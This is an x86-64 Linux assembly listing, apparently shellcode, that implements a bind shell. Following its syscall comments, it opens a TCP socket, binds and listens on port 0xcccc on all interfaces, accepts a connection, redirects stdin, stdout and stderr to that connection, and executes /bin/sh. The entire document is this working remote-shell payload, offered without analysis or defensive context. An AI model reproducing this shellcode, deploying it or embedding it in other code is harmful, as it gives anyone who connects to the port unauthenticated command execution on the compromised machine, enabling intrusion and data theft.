        .intel_syntax noprefix
        .globl _start
_start:
        # s = socket(AF_INET, SOCK_STREAM, 0)
        xor rdx, rdx
        push 1
        pop rsi
        push 2
        pop rdi
        push 41
        pop rax
        syscall
        # bind(s, {sa_family=AF_INET, sin_port=htons(0xcccc), sin_addr=htonl(INADDR_ANY)}, 16)
        mov dl, 16
        mov esi, 0xcccc0002
        push rsi
        mov rsi, rsp
        mov rdi, rax
        mov al, 49
        syscall
        # listen(s, 0)
        xor rsi, rsi
        mov al, 50
        syscall
        # c = accept(s, NULL, 16)
        mov al, 43
        syscall
        # dup2(c, 0), dup2(c, 1), dup2(c, 2)
        mov sil, 2
        mov rdi, rax
dup_loop:
        mov al, 33
        syscall
        dec rsi
        jge dup_loop
        # execve("/bin//sh", {"/bin//sh", NULL}, NULL)
        pop rdx
        xor edx, edx
        push rdx
        mov rdi, 0x68732f2f6e69622f
        push rdi
        mov rdi, rsp
        push rdx
        push rdi
        mov rsi, rsp
        mov al, 59
        syscall
